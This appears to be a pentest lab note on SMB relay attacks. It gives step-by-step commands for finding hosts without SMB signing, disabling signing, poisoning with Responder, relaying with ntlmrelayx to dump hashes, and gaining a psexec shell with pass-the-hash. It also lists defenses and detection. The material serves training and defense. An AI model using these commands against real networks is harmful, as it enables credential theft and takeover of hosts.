# SMB Relay Attack

**MITRE ATT&CK:** T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

## Overview

Instead of cracking a captured NTLM challenge-response offline, an SMB relay
attack forwards it **live** to a second target that accepts SMB
authentication without signing — authenticating as the victim on that target,
without ever knowing their password.

```
Victim ──NTLM auth──> Attacker (relay) ──forwards──> Target SMB Server
```

## Prerequisites

- A way to trigger victim → attacker NTLM authentication (LLMNR poisoning,
  malicious UNC path, coerced auth, etc.).
- **SMB signing disabled** on the relay target — if the target enforces
  signing, the relayed session is rejected.
- Attacker credentials cannot be reused against the *same* host the hash came
  from — relay to a **different** host than the one poisoned.

## Steps

### 1. Sweep for hosts with SMB signing disabled

```bash
nmap --script=smb2-security-mode.nse -p445 <SUBNET>/24
```

Look for `Message signing enabled but not required` — those hosts are
relayable.

### 2. (Lab-only) confirm/set signing state for testing

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
Set-SmbClientConfiguration -RequireSecuritySignature $false -Force
```

### 3. Disable Responder's own SMB/HTTP handlers

`impacket-ntlmrelayx` needs those ports free, so turn Responder's own
SMB/HTTP servers off in its config:

```bash
sudo mousepad /etc/responder/Responder.conf
# set: SMB = Off
#      HTTP = Off
```

### 4. Start Responder (poisoning only, not serving)

```bash
sudo responder -I eth0 -dwv
```

### 5. Build a target list and start the relay

```
# targets.txt — one relay-target IP per line
<TARGET_IP>
```

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### 6. Trigger victim authentication

Same as LLMNR poisoning — victim mistypes a share, or is coerced (e.g. via a
malicious file/UNC path).

### 7. Use the relayed session

`ntlmrelayx` will dump SAM hashes automatically on success, or drop an
interactive shell depending on flags. Captured hashes can then be used
directly:

```bash
impacket-psexec -hashes :<NEW_NT_HASH> <ADMIN_USER>@<TARGET_IP>
```

## Key Notes

- Relay only works **cross-host** — you can't relay a victim's auth back to
  the same machine that sent it.
- This is why SMB signing is the actual fix, not just disabling LLMNR —
  poisoning is one way to *get* auth traffic, but coercion techniques
  (PetitPotam, PrinterBug, etc.) achieve the same trigger without any name
  resolution race.

## Detection & Defenses

- **Enforce SMB signing domain-wide** (`RequireSecuritySignature`) — this is
  the single control that stops relay regardless of how auth was triggered.
- Enable **Extended Protection for Authentication (EPA)** / channel binding
  where supported.
- Monitor Event ID 4624 (Logon Type 3) bursts from a single source host
  hitting many destination hosts in a short window.

---

*Performed against an isolated, self-owned lab domain for training purposes only.*
